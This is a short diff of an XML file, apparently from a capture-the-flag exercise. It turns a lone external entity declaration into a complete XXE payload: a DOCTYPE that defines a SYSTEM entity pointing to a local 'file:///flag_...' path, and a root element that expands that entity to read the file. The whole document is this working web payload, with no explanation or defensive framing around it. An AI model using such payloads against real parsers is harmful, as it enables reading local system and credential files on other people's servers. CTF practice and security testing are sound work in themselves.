@@ -1,1 +1,4 @@
-<!ENTITY attack SYSTEM "file:///flag_c24ccdfc008851700f2249ad5a9ca9f0">
+<!DOCTYPE external [
+<!ENTITY ee SYSTEM "file:///flag_c24ccdfc008851700f2249ad5a9ca9f0">
+]>
+<root>&ee;</root>
